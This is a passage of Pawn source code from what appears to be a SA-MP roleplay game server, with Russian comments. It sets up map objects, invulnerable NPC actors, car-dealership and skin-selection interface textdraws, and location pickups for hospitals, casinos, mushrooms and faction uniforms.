	modernhouse[12] = CreateObject(2267, 220.55, 1036.22, 1088.64, 0, 0, 0);
	
	modernhouse[13] = CreateObject(19462, 230.17, 1026.02, 1092.56, 0, 0, 0); // up
	modernhouse[14] = CreateObject(19462, 230.18, 1033.29, 1092.61, 0, 0, 0);
	modernhouse[15] = CreateObject(19462, 225.47, 1036.37, 1094.90, 0, 0, 90);
	
	modernhouse[16] = CreateObject(2239, 231.39, 1022.07, 1082.98, 0, 0, 42.40);
	//
	// ============================= ACTORS ==============================
	ActorsRob[0] = CreateActor(179, 296.8526,-82.5276,1001.5156,358.8242);
	SetActorVirtualWorld(ActorsRob[0], 0);
	SetActorHealth(ActorsRob[0], 255);
	SetActorInvulnerable(ActorsRob[0], true);
	ActorsRob[1] = CreateActor(179, 295.4810,-40.2167,1001.5156,2.2428);
	SetActorVirtualWorld(ActorsRob[1], 0);
	SetActorHealth(ActorsRob[1], 255);
	SetActorInvulnerable(ActorsRob[1], true);
	ActorsRob[2] = CreateActor(179, 316.1089,-133.7254,999.6016,91.0626);
	SetActorVirtualWorld(ActorsRob[2], 0);
	SetActorHealth(ActorsRob[2], 255);
	SetActorInvulnerable(ActorsRob[2], true);

	ActorsRob[3] = CreateActor(30, 204.8515,-8.1603,1001.2109,268.4108); // ls victim
	SetActorVirtualWorld(ActorsRob[3], 2);
	SetActorHealth(ActorsRob[3], 255);
	SetActorInvulnerable(ActorsRob[3], true);
	ActorsRob[4] = CreateActor(30, 204.8515,-8.1603,1001.2109,268.4108); // sf victim
	SetActorVirtualWorld(ActorsRob[4], 1);
	SetActorHealth(ActorsRob[4], 255);
	SetActorInvulnerable(ActorsRob[4], true);

	ActorsRob[5] = CreateActor(274, 302.2798,180.4841,1214.7949,86.3554); // medic sf
	SetActorVirtualWorld(ActorsRob[5], 3);
	SetActorHealth(ActorsRob[5], 255);
	SetActorInvulnerable(ActorsRob[5], true);
	
	ActorsRob[6] = CreateActor(274, 302.2798,180.4841,1214.7949,86.3554); // medic ls
	SetActorVirtualWorld(ActorsRob[6], 4);
	SetActorHealth(ActorsRob[6], 255);
	SetActorInvulnerable(ActorsRob[6], true);
	
	ActorsRob[7] = CreateActor(274, 302.2798,180.4841,1214.7949,86.3554); // medic lv
	SetActorVirtualWorld(ActorsRob[7], 5);
	SetActorHealth(ActorsRob[7], 255);
	SetActorInvulnerable(ActorsRob[7], true);
	
	ActorsRob[8] = CreateActor(274, 302.2798,180.4841,1214.7949,86.3554); // medic fc
	SetActorVirtualWorld(ActorsRob[8], 6);
	SetActorHealth(ActorsRob[8], 255);
	SetActorInvulnerable(ActorsRob[8], true);
	
	ActorsRob[9] = CreateActor(274, 302.2798,180.4841,1214.7949,86.3554); // medic ls ghetto
	SetActorVirtualWorld(ActorsRob[9], 7);
	SetActorHealth(ActorsRob[9], 255);
	SetActorInvulnerable(ActorsRob[9], true);
	
	ActorsRob[10] = CreateActor(140, 1478.3706,-1369.9069,62.4475,181.5000); // бот на регистрации/авторизации
	SetActorVirtualWorld(ActorsRob[10], 1);
	SetActorInvulnerable(ActorsRob[10], true);
	
	ActorsRob[11] = CreateActor(138, 1476.6990,-1369.9562,62.4475,181.2650); // бот на регистрации/авторизации
	SetActorVirtualWorld(ActorsRob[11], 1);
	SetActorInvulnerable(ActorsRob[11], true);
	
	ActorsRob[12] = CreateActor(223, 1480.4121,-1368.9254,62.4475,0.0509); // бот на регистрации/авторизации
	ApplyActorAnimation(ActorsRob[12], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	SetActorVirtualWorld(ActorsRob[12], 1);
	SetActorInvulnerable(ActorsRob[12], true);
	
	ActorsRob[13] = CreateActor(124, 1481.3646,-1367.4092,62.4475,93.7893); // бот на регистрации/авторизации
	ApplyActorAnimation(ActorsRob[13], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	SetActorVirtualWorld(ActorsRob[13], 1);
	SetActorInvulnerable(ActorsRob[13], true);
	
	ActorsRob[14] = CreateActor(71, 1601.7085,1752.8779,1026.4031,87.2903); // охранник в автошколе
	SetActorVirtualWorld(ActorsRob[14], 1);
	SetActorInvulnerable(ActorsRob[14], true);
	
	ActorsRob[15] = CreateActor(71, 1601.7109,1747.9149,1026.4031,89.2761); // охранник в автошколе
	SetActorVirtualWorld(ActorsRob[15], 1);
	SetActorInvulnerable(ActorsRob[15], true);
	
	ActorsRob[16] = CreateActor(71, 868.9244,313.7268,1078.4357,3.4048); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[16], 1);
	SetActorInvulnerable(ActorsRob[16], true);
	
	ActorsRob[17] = CreateActor(71, 861.3021,313.7231,1078.4357,5.5590); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[17], 1);
	SetActorInvulnerable(ActorsRob[17], true);
	
	ActorsRob[18] = CreateActor(71, 858.2231,314.6925,1078.4357,0.2322); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[18], 1);
	SetActorInvulnerable(ActorsRob[18], true);
	ApplyActorAnimation(ActorsRob[18], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[19] = CreateActor(71, 857.0748,314.6709,1078.4357,3.5612); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[19], 1);
	SetActorInvulnerable(ActorsRob[19], true);
	ApplyActorAnimation(ActorsRob[19], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[20] = CreateActor(71, 872.9334,314.6612,1078.4357,0.3035); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[20], 1);
	SetActorInvulnerable(ActorsRob[20], true);
	ApplyActorAnimation(ActorsRob[20], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[21] = CreateActor(71, 874.0215,314.6646,1078.4357,2.1444); // охранник в мэрии
	SetActorVirtualWorld(ActorsRob[21], 1);
	SetActorInvulnerable(ActorsRob[21], true);
	ApplyActorAnimation(ActorsRob[21], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[22] = CreateActor(227, 862.8875,324.7506,1078.4357,181.7918); // бот в мэрии
	SetActorVirtualWorld(ActorsRob[22], 1);
	SetActorInvulnerable(ActorsRob[22], true);
	ApplyActorAnimation(ActorsRob[22], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[23] = CreateActor(59, 866.2748,324.7557,1078.4357,181.6352); // бот в мэрии
	SetActorVirtualWorld(ActorsRob[23], 1);
	SetActorInvulnerable(ActorsRob[23], true);
	ApplyActorAnimation(ActorsRob[23], "PED", "SEAT_IDLE", 4.1, 1, 0, 0, 1, 0);
	
	ActorsRob[24] = CreateActor(280, 1201.9813,1339.8489,3011.0005,270.3439); // бот в полицейском участе лос-сантос
	SetActorVirtualWorld(ActorsRob[24], 4);
	SetActorInvulnerable(ActorsRob[24], true);
	
	ActorsRob[25] = CreateActor(172, 1393.1124,-1694.6111,39.5699,0.8871); // бот в центральном банке
	SetActorVirtualWorld(ActorsRob[25], 3);
	SetActorInvulnerable(ActorsRob[25], true);
	
	ActorsRob[26] = CreateActor(172, 1395.5935,-1694.6099,39.5699,1.1612); // бот в центральном банке
	SetActorVirtualWorld(ActorsRob[26], 3);
	SetActorInvulnerable(ActorsRob[26], true);
	
	ActorsRob[27] = CreateActor(172, 1398.1259,-1694.6117,39.5699,1.8271); // бот в центральном банке
	SetActorVirtualWorld(ActorsRob[27], 3);
	SetActorInvulnerable(ActorsRob[27], true);
	
	ActorsRob[28] = CreateActor(172, 1400.5551,-1694.6157,39.5699,0.6912); // бот в центральном банке
	SetActorVirtualWorld(ActorsRob[28], 3);
	SetActorInvulnerable(ActorsRob[28], true);
	
	ActorsRob[29] = CreateActor(172, 1403.1495,-1694.6134,39.5699,0.8479); // бот в центральном банке
	SetActorVirtualWorld(ActorsRob[29], 3);
	SetActorInvulnerable(ActorsRob[29], true);
	
	for(new i = 0; i < 10; i++) cdrob[i] = false;
	SetTimer("RobbingTimer", 2000, true);
	
	//=============================Nautosalon==================================
	//AutoSalon
	AutoShopText[0] = TextDrawCreate(527.000000, 230.000000, "<<");
	TextDrawLetterSize(AutoShopText[0], 0.220000, 1.199999);

	AutoShopText[1] = TextDrawCreate(581.000000, 230.000000, ">>");
	TextDrawLetterSize(AutoShopText[1], 0.220000, 1.199999);

	AutoShopText[2] = TextDrawCreate(581.000000, 271.000000, ">");
	TextDrawLetterSize(AutoShopText[2], 0.220000, 0.599999);

	AutoShopText[3] = TextDrawCreate(581.000000, 281.000000, ">");
	TextDrawLetterSize(AutoShopText[3], 0.220000, 0.599999);

	AutoShopText[4] = TextDrawCreate(527.000000, 281.000000, "<");
	TextDrawLetterSize(AutoShopText[4], 0.220000, 0.599999);

	AutoShopText[5] = TextDrawCreate(527.000000, 271.000000, "<");
	TextDrawLetterSize(AutoShopText[5], 0.220000, 0.599999);

	for(new s; s < 6; s++)
	{
		TextDrawTextSize(AutoShopText[s], 10.10, 40.40);
		TextDrawAlignment(AutoShopText[s], 2);
		TextDrawBackgroundColor(AutoShopText[s], 255);
		TextDrawFont(AutoShopText[s], 2);
		TextDrawColor(AutoShopText[s], -1);
		TextDrawSetProportional(AutoShopText[s], 1);
		TextDrawSetShadow(AutoShopText[s], 1);
		TextDrawUseBox(AutoShopText[s], 1);
		TextDrawBoxColor(AutoShopText[s], 555819392);
		TextDrawSetSelectable(AutoShopText[s],true);
	}

	AutoShopText[6] = TextDrawCreate(556.000000, 311.000000, "BUY");
	TextDrawLetterSize(AutoShopText[6], 0.450000, 0.899999);
	TextDrawBoxColor(AutoShopText[6], 144);
	TextDrawTextSize(AutoShopText[6], 10.10, 56.56);
	TextDrawSetSelectable(AutoShopText[6], 1);

	AutoShopText[7] = TextDrawCreate(556.000000, 331.000000, "EXIT");
	TextDrawLetterSize(AutoShopText[7], 0.450000, 0.899999);
	TextDrawBoxColor(AutoShopText[7], 144);
	TextDrawTextSize(AutoShopText[7], 10.10, 56.56);
	TextDrawSetSelectable(AutoShopText[7],true);

	AutoShopText[8] = TextDrawCreate(554.000000, 161.000000, "_");// фон
	TextDrawLetterSize(AutoShopText[8], 0.500000, 22.200017);
	TextDrawSetProportional(AutoShopText[8], 1);
	TextDrawBoxColor(AutoShopText[8], 1128481664);
	TextDrawTextSize(AutoShopText[8], 0.000000, 105.000000);

	for(new e = 6; e < 9; e++)
	{
		TextDrawAlignment(AutoShopText[e], 2);
		TextDrawBackgroundColor(AutoShopText[e], 255);
		TextDrawFont(AutoShopText[e], 1);
		TextDrawColor(AutoShopText[e], -1);
		TextDrawSetProportional(AutoShopText[e], 1);
		TextDrawSetShadow(AutoShopText[e], 1);
		TextDrawUseBox(AutoShopText[e], 1);
	}

	AutoShopText[9] = TextDrawCreate(522.000000, 211.000000, "SELECT CAR");
	AutoShopText[10] = TextDrawCreate(537.000000, 251.000000, "COLOR");
	AutoShopText[11] = TextDrawCreate(541.000000, 165.000000, "INFO");

	for(new r = 9; r < 12; r++)
	{
		TextDrawBackgroundColor(AutoShopText[r], 255);
		TextDrawFont(AutoShopText[r], 2);
		TextDrawSetOutline(AutoShopText[r], 0);
		TextDrawSetShadow(AutoShopText[r], 0);
		TextDrawLetterSize(AutoShopText[r], 0.260000, 1.300000);
		TextDrawColor(AutoShopText[r], -2016477185);
		TextDrawSetProportional(AutoShopText[r], 1);
	}
	//=============================AutoSalon===================================
	DRAP = TextDrawCreate(510.0, 120.0, "~n~~n~\t~b~[]select~n~\t\t\t~g~next: ~w~q ~n~\t\t\t~g~last: ~w~e~n~~n~\t~b~[]select color ~n~\t\t\t~g~next: ~w~num4 ~n~\t\t\t~g~last: ~w~num6~n~~n~\t~b~[]other ~n~\t\t\t~g~switch color: ~w~space~n~~n~\t\t\t~g~accept: ~w~return ~n~\t\t\t~r~cancel: ~w~c ~n~");
	TextDrawFont(DRAP, 2);
	TextDrawLetterSize(DRAP, 0.20,0.80);
	TextDrawColor(DRAP, -1);
	TextDrawSetShadow(DRAP, 1);
	TextDrawBackgroundColor(DRAP, 0x00000044);
	TextDrawSetOutline(DRAP, 0);
	TextDrawSetProportional(DRAP, 3);
	TextDrawAlignment(DRAP, 1);
	TextDrawUseBox(DRAP, 1);
	TextDrawBoxColor(DRAP, COLOR_BOX);
	//============================Выбор скина===================================
	Select_Skin_TD[0] = TextDrawCreate(240.0000, 363.2265, "Box");
	TextDrawLetterSize(Select_Skin_TD[0], 0.0000, 7.6799);
	TextDrawTextSize(Select_Skin_TD[0], 414.0000, 0.0000);
	TextDrawAlignment(Select_Skin_TD[0], 1);
	TextDrawColor(Select_Skin_TD[0], -1);
	TextDrawUseBox(Select_Skin_TD[0], 1);
	TextDrawBoxColor(Select_Skin_TD[0], 606875647);
	TextDrawBackgroundColor(Select_Skin_TD[0], 255);
	TextDrawFont(Select_Skin_TD[0], 1);
	TextDrawSetProportional(Select_Skin_TD[0], 1);
	TextDrawSetShadow(Select_Skin_TD[0], 0);

	Select_Skin_TD[1] = TextDrawCreate(235.3999, 379.4978, "LD_BEAT:chit");
	TextDrawTextSize(Select_Skin_TD[1], 32.0000, 39.0000);
	TextDrawAlignment(Select_Skin_TD[1], 1);
	TextDrawColor(Select_Skin_TD[1], -5963521);
	TextDrawBackgroundColor(Select_Skin_TD[1], 255);
	TextDrawFont(Select_Skin_TD[1], 4);
	TextDrawSetProportional(Select_Skin_TD[1], 0);
	TextDrawSetShadow(Select_Skin_TD[1], 0);

	Select_Skin_TD[2] = TextDrawCreate(383.3998, 380.4931, "LD_BEAT:chit");
	TextDrawTextSize(Select_Skin_TD[2], 32.0000, 39.0000);
	TextDrawAlignment(Select_Skin_TD[2], 1);
	TextDrawColor(Select_Skin_TD[2], -5963521);
	TextDrawBackgroundColor(Select_Skin_TD[2], 255);
	TextDrawFont(Select_Skin_TD[2], 4);
	TextDrawSetProportional(Select_Skin_TD[2], 0);
	TextDrawSetShadow(Select_Skin_TD[2], 0);

	Select_Skin_TD[3] = TextDrawCreate(400.7994, 388.1155, ">>");
	TextDrawLetterSize(Select_Skin_TD[3], 0.3675, 2.5415);
	TextDrawTextSize(Select_Skin_TD[3], 48.4799, 15.0000);
	TextDrawAlignment(Select_Skin_TD[3], 2);
	TextDrawColor(Select_Skin_TD[3], -1);
	TextDrawBackgroundColor(Select_Skin_TD[3], 255);
	TextDrawFont(Select_Skin_TD[3], 0);
	TextDrawSetProportional(Select_Skin_TD[3], 1);
	TextDrawSetShadow(Select_Skin_TD[3], 0);
	TextDrawSetSelectable(Select_Skin_TD[3], true);

	Select_Skin_TD[4] = TextDrawCreate(250.7998, 386.6221, "<<");
	TextDrawLetterSize(Select_Skin_TD[4], 0.3675, 2.5415);
	TextDrawTextSize(Select_Skin_TD[4], 48.4799, 15.0000);
	TextDrawAlignment(Select_Skin_TD[4], 2);
	TextDrawColor(Select_Skin_TD[4], -1);
	TextDrawBackgroundColor(Select_Skin_TD[4], 255);
	TextDrawFont(Select_Skin_TD[4], 2);
	TextDrawSetProportional(Select_Skin_TD[4], 1);
	TextDrawSetShadow(Select_Skin_TD[4], 0);
	TextDrawSetSelectable(Select_Skin_TD[4], true);

	Select_Skin_TD[5] = TextDrawCreate(351.1995, 418.9777, "Accept");
	TextDrawLetterSize(Select_Skin_TD[5], 0.2337, 1.1311);
	TextDrawTextSize(Select_Skin_TD[5], 20.0000, 36.0000);
	TextDrawAlignment(Select_Skin_TD[5], 2);
	TextDrawColor(Select_Skin_TD[5], -1);
	TextDrawBackgroundColor(Select_Skin_TD[5], 255);
	TextDrawFont(Select_Skin_TD[5], 2);
	TextDrawSetProportional(Select_Skin_TD[5], 1);
	TextDrawSetShadow(Select_Skin_TD[5], 0);
	TextDrawSetSelectable(Select_Skin_TD[5], true);

	Select_Skin_TD[6] = TextDrawCreate(293.1995, 417.9819, "Cancel");
	TextDrawLetterSize(Select_Skin_TD[6], 0.2337, 1.1311);
	TextDrawTextSize(Select_Skin_TD[6], 20.0000, 26.0000);
	TextDrawAlignment(Select_Skin_TD[6], 2);
	TextDrawColor(Select_Skin_TD[6], -1);
	TextDrawBackgroundColor(Select_Skin_TD[6], 255);
	TextDrawFont(Select_Skin_TD[6], 2);
	TextDrawSetProportional(Select_Skin_TD[6], 1);
	TextDrawSetShadow(Select_Skin_TD[6], 0);
	TextDrawSetSelectable(Select_Skin_TD[6], true);
	//=============================Прогрузка интерьера==========================
	IntLoad_TD[0] = TextDrawCreate(-20.0, 0.0, "_");
	TextDrawUseBox(IntLoad_TD[0], true);
	TextDrawBoxColor(IntLoad_TD[0], 102);
	TextDrawAlignment(IntLoad_TD[0], 1);
	TextDrawFont(IntLoad_TD[0], 0);
	TextDrawLetterSize(IntLoad_TD[0], 1.000000, 52.200000);
	TextDrawColor(IntLoad_TD[0], 0);

	IntLoad_TD[1] = TextDrawCreate(234.666717, 142.696319, "LOADING TEXTURES");
	TextDrawLetterSize(IntLoad_TD[1], 0.449999, 1.600000);
	TextDrawAlignment(IntLoad_TD[1], 1);
	TextDrawColor(IntLoad_TD[1], -1);
	TextDrawSetShadow(IntLoad_TD[1], 0);
	TextDrawSetOutline(IntLoad_TD[1], 0);
	TextDrawBackgroundColor(IntLoad_TD[1], 51);
	TextDrawFont(IntLoad_TD[1], 2);
	TextDrawSetProportional(IntLoad_TD[1], 1);

	IntLoad_TD[2] = TextDrawCreate(264.000152, 301.570678, "PLEASE WAIT");
	TextDrawLetterSize(IntLoad_TD[2], 0.449999, 1.600000);
	TextDrawAlignment(IntLoad_TD[2], 1);
	TextDrawColor(IntLoad_TD[2], -1);
	TextDrawSetShadow(IntLoad_TD[2], 0);
	TextDrawSetOutline(IntLoad_TD[2], 0);
	TextDrawBackgroundColor(IntLoad_TD[2], 51);
	TextDrawFont(IntLoad_TD[2], 2);
	TextDrawSetProportional(IntLoad_TD[2], 1);

	IntLoad_TD[3] = TextDrawCreate(239.333389, 129.837020, "New Textdraw");
	TextDrawLetterSize(IntLoad_TD[3], 0.449999, 1.600000);
	TextDrawTextSize(IntLoad_TD[3], 148.333389, 179.614837);
	TextDrawAlignment(IntLoad_TD[3], 1);
	TextDrawColor(IntLoad_TD[3], -1);
	TextDrawBackgroundColor(IntLoad_TD[3], 0x00000000);
	TextDrawSetShadow(IntLoad_TD[3], 0);
	TextDrawSetOutline(IntLoad_TD[3], 1);
	TextDrawFont(IntLoad_TD[3], 5);
	TextDrawSetProportional(IntLoad_TD[3], 1);
	TextDrawSetPreviewModel(IntLoad_TD[3], 3067);
	TextDrawSetPreviewRot(IntLoad_TD[3], 0.000000, 0.000000, 180.000000, 1.000000);

	IntLoad_TD[4] = TextDrawCreate(239.333389, 129.837020, "New Textdraw");
	TextDrawLetterSize(IntLoad_TD[4], 0.449999, 1.600000);
	TextDrawTextSize(IntLoad_TD[4], 148.333389, 179.614837);
	TextDrawAlignment(IntLoad_TD[4], 1);
	TextDrawColor(IntLoad_TD[4], -1);
	TextDrawBackgroundColor(IntLoad_TD[4], 0x00000000);
	TextDrawSetShadow(IntLoad_TD[4], 0);
	TextDrawSetOutline(IntLoad_TD[4], 1);
	TextDrawFont(IntLoad_TD[4], 5);
	TextDrawSetProportional(IntLoad_TD[4], 1);
	TextDrawSetPreviewModel(IntLoad_TD[4], 2943);
	TextDrawSetPreviewRot(IntLoad_TD[4], 0.000000, 0.000000, 180.000000, 1.000000);
	//
	//gpickup = CreatePickup(2060,23,2225.2063,-2276.5874,14.7647);
	//
	boyidet = false;
	//
	garagexit[0] = CreatePickupAC(1318,23,252.8194,-110.6712,1004.0859,-1);//
	garagexit[1] = CreatePickupAC(1318,23,428.7611,469.5622,1003.0859,-1);//
	garagexit[2] = CreatePickupAC(1318,23,904.5699,22.8954,1004.0859,-1);//
	garagexit[3] = CreatePickupAC(1318,23,516.2317,511.4258,1002.2659,-1);//
	//
	new prodpick[2];
	prodpick[0] = CreatePickupAC(1239,23,-1027.4069,-593.4584,32.0126);
	prodpick[1] = CreatePickupAC(1239,23,-514.4622,-543.0626,25.5234);
	//
	RouletCloakroom[0] = CreatePickupAC(1275, 23, 1963.7473,1063.2229,994.4688,-1); // Four Dragons
	RouletCloakroom[1] = CreatePickupAC(1275, 23, 2150.5393,1603.1434,1006.1802,-1); // Caligula
	//
	skills[0] = CreatePickupAC(1318,23,306.3997,-159.1386,999.5938,-1); // Входы для прокачки скиллов
	skills[1] = CreatePickupAC(1318,23,305.6985,-159.1157,999.5938,-1); // Выход :)
	ammonac[0] = CreatePickupAC(1318,23,1368.9360,-1279.7216,13.5469);//
	ammonac[1] = CreatePickupAC(1318,23,285.4752,-41.7966,1001.5156);//
	ammonac[2] = CreatePickupAC(1318,23,-2625.8296,208.2379,4.8125);//
	ammonac[3] = CreatePickupAC(1318,23,285.9187,-86.7644,1001.5229);//
	ammonac[4] = CreatePickupAC(1318,23,2159.5449,943.2165,10.8203);//
	ammonac[5] = CreatePickupAC(1318,23,315.8831,-143.6591,999.6016);//
	auctionpic[0] = CreatePickupAC(19134,23,847.7385,324.6250,1081.7716,1); // Аукцион в мэрии
	auctionpic[1] = CreatePickupAC(19134,23,847.7350,316.9961,1081.7697,1); // Аукцион в мэрии
	monitoring = CreatePickupAC(1239,23,847.7424,320.6833,1081.7697,1); // мониторинг бизнесов
	pickcars[0] = CreatePickupAC(19134,23,acarsd[0][0],acarsd[0][1],acarsd[0][2]);// Выдача мопеда автоугонщикам.
	pickcars[1] = CreatePickupAC(19134,23,acarsd[1][0],acarsd[1][1],acarsd[1][2]);// Выдача мопеда автоугонщикам.
	pickcars[2] = CreatePickupAC(19134,23,acarsd[2][0],acarsd[2][1],acarsd[2][2]);// Выдача мопеда автоугонщикам.
	pickcars[3] = CreatePickupAC(19134,23,2515.4497,-1465.3451,23.9989);// Выдача мопеда автоугонщикам.
	pickcars[4] = CreatePickupAC(1239,23,2494.1060,-1464.7142,24.0255);// Работа автоугонщика.
	parashut = CreatePickupAC(1310,23,2428.0544,-741.8817,1422.5161); // Parachut Admins
	caligula[0] = CreatePickupAC(19132,23,2233.9912,1714.6836,1012.3828,-1);// Выход Caligula
	caligula[2] = CreatePickupAC(19132,23,2196.9653,1677.1547,12.3672);// Вход Caligula
	dragons[0] = CreatePickupAC(19132,23,2019.07,1017.6940,996.8750,-1);// Выход 4'Dragons
	dragons[1] = CreatePickupAC(19132,23,2019.3192,1007.7440,10.8203);// Вход 4'Dragons
	//===========================[ГРИБЫ]========================================
	mushroom[0] = CreatePickupAC(1603, 2, -332.3008,-1987.6200,26.1051); //
	CreatePickupAC(1603, 2, -375.2895,-2004.4412,28.4262); //
	CreatePickupAC(1603, 2, -420.7345,-1962.1367,20.7989); //
	CreatePickupAC(1603, 2, -370.9467,-2049.1355,28.5462); //
	CreatePickupAC(1603, 2, -448.5980,-2072.9041,80.6654); //
	CreatePickupAC(1603, 2, -490.3048,-2121.0930,89.5054); //
	CreatePickupAC(1603, 2, -515.2039,-2223.6245,42.7538); //
	CreatePickupAC(1603, 2, -556.2787,-2223.5444,34.8664); //
	CreatePickupAC(1603, 2, -653.4810,-2185.8540,14.6571); //
	CreatePickupAC(1603, 2, -697.4235,-2144.5728,24.7645); //
	CreatePickupAC(1603, 2, -913.5545,-2281.5803,45.6804); //
	CreatePickupAC(1603, 2, -924.2963,-2392.5601,63.9710); //
	CreatePickupAC(1603, 2, -921.2469,-2419.2676,73.1529); //
	CreatePickupAC(1603, 2, -928.6000,-2452.7974,90.8816); //
	CreatePickupAC(1603, 2, -1092.1782,-2576.2622,77.2730); //
	CreatePickupAC(1603, 2, -1114.4218,-2326.8787,44.7146); //
	CreatePickupAC(1603, 2, -1095.8896,-2317.7642,51.1427); //
	CreatePickupAC(1603, 2, -1036.0745,-2331.6079,60.0633); //
	CreatePickupAC(1603, 2, -1823.0471,-2169.1082,77.6051); //
	CreatePickupAC(1603, 2, -1745.4077,-2018.1677,74.5071); //
	CreatePickupAC(1603, 2, -1943.8130,-2144.5457,76.9309); //
	CreatePickupAC(1603, 2, -1955.9766,-2162.8020,75.9688); //
	CreatePickupAC(1603, 2, -1685.1254,-2385.9275,99.3290); //
	CreatePickupAC(1603, 2, -1643.7135,-2411.9897,95.7691); //
	CreatePickupAC(1603, 2, -1551.1573,-2505.1743,90.8708); //
	CreatePickupAC(1603, 2, -1465.4910,-2556.2893,63.7663); //
	CreatePickupAC(1603, 2, -1435.4855,-2544.3879,60.4281); //
	CreatePickupAC(1603, 2, -1401.0656,-2548.1582,55.9067); //
	CreatePickupAC(1603, 2, -1347.5752,-2507.9780,37.0068); //
	CreatePickupAC(1603, 2, -1328.0197,-2467.7183,27.8259); //
	CreatePickupAC(1603, 2, -1290.3135,-2479.8984,16.9108); //
	CreatePickupAC(1603, 2, -1277.4055,-2498.1367,11.4951); //
	CreatePickupAC(1603, 2, -568.3260,-2276.3220,27.5938);
	CreatePickupAC(1603, 2, -653.1019,-2255.4465,23.3936);
	CreatePickupAC(1603, 2, -614.5738,-2398.0959,28.0911);
	CreatePickupAC(1603, 2, -620.2932,-2477.4644,52.8450);
	CreatePickupAC(1603, 2, -673.6429,-2562.6052,58.4840);
	CreatePickupAC(1603, 2, -797.0350,-2611.4380,85.9543);
	CreatePickupAC(1603, 2, -814.8298,-2713.2485,90.4954);
	CreatePickupAC(1603, 2, -900.3575,-2635.6716,96.5351);
	CreatePickupAC(1603, 2, -908.8201,-2450.1675,86.1361);
	CreatePickupAC(1603, 2, -564.7324,-2000.7518,48.2172);
	CreatePickupAC(1603, 2, -514.0831,-1990.8127,46.7821);
	CreatePickupAC(1603, 2, -386.3437,-1968.6517,25.7109);
	CreatePickupAC(1603, 2, -285.8642,-2063.6074,34.5075);
	CreatePickupAC(1603, 2, -1735.6969,-2501.1594,10.1409);
	CreatePickupAC(1603, 2, -1840.7139,-2382.2207,29.1400);
	CreatePickupAC(1603, 2, -1906.1353,-2212.6089,77.4492);
	CreatePickupAC(1603, 2, -1874.5731,-1969.2981,87.2874);
	CreatePickupAC(1603, 2, -1739.6145,-1950.4650,98.8599);
	CreatePickupAC(1603, 2, -1613.4684,-1867.4391,86.1701);
	CreatePickupAC(1603, 2, -1868.5590,-1894.4634,88.9713);
	mushroom[1] = CreatePickupAC(1603, 2, -2005.6901,-1937.4910,77.0140);
	//========================================[ГРИБЫ]========================================
	medicss[0] = CreatePickupAC(1318,23,-2664.7141,639.9803,14.4531); // Медики SF Вход
	medicss[1] = CreatePickupAC(1318,23,281.1904,183.1636,1214.7949,3); // Медики SF Выход
	medicss[2] = CreatePickupAC(1318,23,1172.0767,-1323.3440,15.4030); // Медики LS Вход
	medicss[3] = CreatePickupAC(1318,23,281.1904,183.1636,1214.7949,4); // Медики LS Выход
	medicss[4] = CreatePickupAC(1318,23,1607.2877,1815.2422,10.8203); // Медики LV Вход
	medicss[5] = CreatePickupAC(1318,23,281.1904,183.1636,1214.7949,5); // Медики LV Выход
	medicss[6] = CreatePickupAC(1318,23,-320.0217,1048.2347,20.3403); // Медики LV Вход
	medicss[7] = CreatePickupAC(1318,23,281.1904,183.1636,1214.7949,6); // Медики LV Выход
	medicss[8] = CreatePickupAC(1318,23,2034.1124,-1401.8556,17.2942); // Медики CGH Вход
	medicss[9] = CreatePickupAC(1318,23,281.1904,183.1636,1214.7949,7); // Медики CGH Выход
	sportzal[0] = CreatePickupAC(1318,23,2097.9495,2494.1621,14.8390); // Спортзал LV Вход
	sportzal[1] = CreatePickupAC(1318,23,772.4290,-5.0806,1000.7289); // Спортзал LV Выход
	lspic[0] = CreatePickupAC(19130,23,1658.6239,-1691.3878,15.6094); // LSN вход
	lspic[1] = CreatePickupAC(1318,23,1650.8948,-1654.2299,99.7110,1); // LSN выход
	lvpic[0] = CreatePickupAC(19130,23,2648.9949,1185.3920,10.8203); // LVN вход на крышу
	lvpic[1] = CreatePickupAC(1318,23,2643.5535,1193.7731,39.7110,3); // LVN выход на парковку
	rabota1 = CreatePickupAC(1239,23,2230.4875,-2211.9368,13.5469); // Грузчики инфо
	chekmats[0] = CreatePickupAC(1239,2,-1294.7273,490.1304,11.1953); // Пикап 1
	chekmats[1] = CreatePickupAC(1239,2,-1400.6083,491.5404,11.1953); // Пикап 2
	serdce[0] = CreatePickupAC(1240,23,1160.3256,-1768.5709,16.5938); // Сердце Спавн
	serdce[1] = CreatePickupAC(1240,23,1753.4606,-1916.4948,13.5698); // Сердце Автовокзал
 	serdce[2] = CreatePickupAC(1240,23,2354.1650,1653.1318,3040.7622,7); // Сердце Автошкола
	serdce[3] = CreatePickupAC(1240,23,860.4421,336.0792,1081.7716,1); // Сердце Мэрия
	sportfrac = CreatePickupAC(1275, 23, 756.2290,5.9802,1000.6988);
	FormaFracPic[0] = CreatePickupAC(1275, 23, 1220.1033,1341.3765,3011.0005,4);
	FormaFracPic[1] = CreatePickupAC(1275, 23, -2461.1140,509.1903,1039.1460,130);
	FormaFracPic[2] = CreatePickupAC(1275, 23, -1344.0225,490.3044,11.2027);
	FormaFracPic[3] = CreatePickupAC(1275, 23, 302.7346,171.9863,1214.7949,3);//SFMC
	FormaFracPic[4] = CreatePickupAC(1275, 23, 864.4636,339.2813,1081.7729,1);
	FormaFracPic[5] = CreatePickupAC(1275, 23, -2068.8213,457.6702,191.0859,2);
	FormaFracPic[6] = CreatePickupAC(1275, 23, 220.2224,111.7548,1010.2118);
	FormaFracPic[7] = CreatePickupAC(1275, 23, 1576.0839,1755.9922,1026.4031,1);
	FormaFracPic[8] = CreatePickupAC(1275, 23, 1639.8848,-1638.5664,101.0859,1);
	FormaFracPic[9] = CreatePickupAC(1275, 23, 240.4291,1860.7698,8.7578);
	FormaFracPic[10] = CreatePickupAC(1275, 23, 2632.5681,1209.4713,41.0859,3);
